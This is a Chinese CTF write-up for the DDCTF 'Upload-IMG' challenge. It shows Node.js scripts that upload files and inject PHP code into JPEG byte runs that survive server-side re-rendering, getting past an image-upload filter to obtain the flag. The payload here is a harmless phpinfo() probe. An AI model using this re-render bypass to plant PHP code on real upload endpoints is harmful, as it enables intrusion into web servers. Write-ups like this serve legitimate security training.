## 0x03. Web 3 - Upload IMG
### 题目
> Upload-IMG  
> 
> http://117.51.148.166/upload.php  
> user：dd@ctf  
> pass：DD@ctf#000  

### 解题过程
用题目的用户名和密码访问入口：

TODO:home.screenshot.jpg

页面只有一个文件选择器和提交按钮，那么先检查一下首页的源代码：

```html
<html>
<body>

<form action="upload.php?type=upload" method="post"
enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="file" id="file" /> 
<br />
<input type="submit" name="submit" value="Submit" />
</form>

</body>
</html>
```

没有多余的内容，可以确定 `upload.php?type=upload` 就是一个上传文件的接口，并且 FormData 中仅有一个 `file` 项。

试着上传个 [阿猫](./assets/avatar.jpg) 看看：

TODO:upload-1.screenshot.jpg

```html
<img src="image/190413104517_315539082.jpg"><br>[Check Error]上传的图片源代码中未包含指定字符串:<font color="red">phpinfo()</font>
```

所以意思是要把 phpinfo() 塞进文件里咯。

![](https://media.giphy.com/media/8Rx1VaCae7OCs/giphy.gif)

为了方便调试，先写个上传文件的脚本：

```javascript
const fs = require('fs')
const path = require('path')
const got = require('got')
const FormData = require('form-data')
const cheerio = require('cheerio')
const { base64 } = require('../common/utils')

const HOST = 'http://117.51.148.166'
const AUTHORIZATION = 'dd@ctf:DD@ctf#000'

async function upload (filePath) {
  const url = `${HOST}/upload.php?type=upload`
  const form = new FormData()
  form.append('file', fs.createReadStream(filePath))

  const { body } = await got.post(url, {
    headers: {
      'Authorization': `Basic ${base64.encode(AUTHORIZATION)}`,
    },
    body: form,
  })
  const $ = cheerio.load(body)
  const source = `${HOST}/${$('img').attr('src')}`
  const message = body.split('<br>')[1] || body.split('<br>')[0]
  return {
    source,
    message,
  }
}

if (module.parent) {
  module.exports = upload
  return
}

;(async () => {
  let result = await upload(path.resolve(process.cwd(), process.argv[2]))
  process.stdout.write(JSON.stringify(result))
})()
```

再写个满足要求的探针文件 `probe.php`：

```php
<?php phpinfo() ?>
```

上传试试：

```sh
node ./upload.js ./assets/probe.php
# <- {"source":"http://117.51.148.166/undefined","message":"请上传JPG/GIF/PNG格式的图片文件"}
```

看来还做了文件类型检查。再试下将 `probe.php` 的内容放到图片文件的尾部：

```sh
cat ./assets/avatar.jpg ./assets/probe.php > ./vendors/probe.jpg
```

检查文件内容：

```sh
xxd ./vendors/probe.jpg
```

```hex
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 fffe 003b 4352 4541 544f 523a  .`.....;CREATOR:
00000020: 2067 642d 6a70 6567 2076 312e 3020 2875   gd-jpeg v1.0 (u
00000030: 7369 6e67 2049 4a47 204a 5045 4720 7636  sing IJG JPEG v6
00000040: 3229 2c20 7175 616c 6974 7920 3d20 3930  2), quality = 90
00000050: 0aff db00 4300 0302 0203 0202 0303 0303  ....C...........
00000060: 0403 0304 0508 0505 0404 050a 0707 0608  ................
...
000096d0: fdf2 7fc6 9dff 0009 c5ff 00fc f3b7 ff00  ................
000096e0: be4f f8d2 62bd 8fff d93c 3f70 6870 2070  .O..b....<?php p
000096f0: 6870 696e 666f 2829 203f 3e0a            hpinfo() ?>.
```

将合并后的文件上传：

```sh
node ./upload.js vendors/probe.jpg
# <- {"source":"http://117.51.148.166/image/190419094301_1940362407.jpg","message":"[Check Error]上传的图片源代码中未包含指定字符串:<font color=\"red\">phpinfo()</font>"}
```

居然失败了。

把上传后的文件下载下来，比对发现尾部内容消失了，文件体积也明显和原来不一样 (38KB -> 28KB) —— 看样子是经历了 **二次渲染**：

```sh
curl -u dd@ctf:DD@ctf#000 -s http://117.51.148.166/image/190419094301_1940362407.jpg | xxd
```

```hex
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 fffe 003b 4352 4541 544f 523a  .`.....;CREATOR:
00000020: 2067 642d 6a70 6567 2076 312e 3020 2875   gd-jpeg v1.0 (u
00000030: 7369 6e67 2049 4a47 204a 5045 4720 7638  sing IJG JPEG v8
00000040: 3029 2c20 7175 616c 6974 7920 3d20 3830  0), quality = 80
00000050: 0aff db00 4300 0604 0506 0504 0606 0506  ....C...........
00000060: 0707 0608 0a10 0a0a 0909 0a14 0e0f 0c10  ................
...
00006f30: ec7f 91ff 001a 486c dc1c 114e cd60 aeab  ......Hl...N.`..
00006f40: 3ff7 63fc 8ff8 d3bf b567 feec 7f91 ff00  ?.c......g......
00006f50: 1a04 7fff d9                             .....
```

那么接下来的思路是，找出图片经二次渲染后不会被更改的二进制片段，然后把想要注入的信息填入这些片段中。

但因为修改二进制后，渲染的输入必定发生变化，那么不会被更改的二进制片段也就可能不再是原来所找到的那些。
这意味着 —— 这一步并非百分百能成功，需要尝试不同的输入文件和片段（而图片内容也应足够复杂）。

在这里我把 [被二次渲染过的图片文件](./vendors/190413104517_315539082.jpg) 重新上传一次，拿到 [被第三次渲染的图片文件](./vendors/190413104640_171516771.jpg)。
由于两次渲染操作都是出自同一份渲染器，所以体积差别不大（~28K），其次二进制内容也更容易出现相同的片段。

那么再写个脚本，从前一份文件里找出被再次渲染时没有发生变化的片段，然后往这些片段里填入目标字符串（这里我用 `<?phpinfo()?>` 尝试）：

```javascript
const fs = require('fs')
const path = require('path')
const del = require('del')
const mkdirp = require('mkdirp')
const split = require('just-split')
const diff = require('diff-sequences').default

const OUTPUT_DIR = path.resolve(__dirname, './vendors/inject-output')

function getReady () {
  del.sync(OUTPUT_DIR)
  mkdirp.sync(OUTPUT_DIR)
}

async function inject (str, filePaths) {
  getReady()

  const files = filePaths.map((p) => fs.readFileSync(p, 'hex'))
  const sequences = files.map((file) =>
    split(file.split(''), 2).map((arr) => arr.join(''))
  )

  const injection = Buffer.from(str).toString('hex')
  const size = injection.length

  let areas = []

  console.log(`Searching diff areas...`)

  diff(
    sequences[0].length,
    sequences[1].length, (l, r) => sequences[0][l] === sequences[1][r],
    (len, l, r) => {
      if (len > size / 2) {
        areas.push(l)
      }
    }
  )

  console.log(`${areas.length} areas found.`)

  let output = []

  areas.forEach((position, index) => {
    let hex = [...sequences[0]]
    for (let i = 0; i < size; i += 2) {
      hex[position + i / 2] = injection[i] + injection[i + 1]
    }
    let buf = Buffer.from(hex.join(''), 'hex')
    let p = path.resolve(OUTPUT_DIR, `${index}.jpg`)
    fs.writeFileSync(p, buf)
    output.push(p)
  })

  console.log(`Injection finished. Check ${OUTPUT_DIR}`)

  return output
}

if (module.parent) {
  module.exports = inject
  return
}

/**
 * Usages:
 *
 * ```sh
 * node ./inject.js [content] [file1] [file2]
 * ```
 *
 * Example:
 *
 * ```sh
 * node ./inject.js "<?phpinfo()?>" ./vendors/190413104517_315539082.jpg ./vendors/190413104640_171516771.jpg
 * # <- Searching diff areas...
 * # <- 11 areas found.
 * # <- Injection finished. Check ./vendors/injected/
 * ```
 *
 */
;(async () => {
  let paths = process.argv.slice(3, 5).map((p) =>
    path.resolve(process.cwd(), p)
  )
  await inject(process.argv[2], paths)
})()
```

执行脚本：

```sh
node ./inject.js "<?phpinfo()?>" ./vendors/190413104517_315539082.jpg ./vendors/190413104640_171516771.jpg
# <- Searching diff areas...
# <- 11 areas found.
# <- Injection finished. Check ./vendors/inject-output/
```

生成的 11 份文件存放在了 [./vendors/inject-output/](./vendors/inject-output) 中。
虽然所有文件在视觉上都发生了明显的变化，但逐个上传后发现其中 [2.jpg](./vendors/inject-output/2.jpg) 和 [4.jpg](./vendors/inject-output/4.jpg) 注入的片段在重新渲染后没有消失：

```sh
node ./upload.js ./vendors/inject-output/2.jpg
# <- {"source":"http://117.51.148.166/image/190419102134_1307243295.jpg","message":"[Success]Flag=DDCTF{B3s7_7ry_php1nf0_b92ef5babce79fad}"}
```

于是获得 flag `DDCTF{B3s7_7ry_php1nf0_b92ef5babce79fad}`，顺利拿下第三关 :v:。


### 涉及资料
- 源代码
  - [上传文件](./upload.js)
  - [向相同片段注入数据](./inject.js)
  - [完整通关脚本](./index.js)
- 知识点
  - [upload-labs](https://github.com/c0ny1/upload-labs)
  - [upload-labs 之 pass 16 详细分析](https://xz.aliyun.com/t/2657)
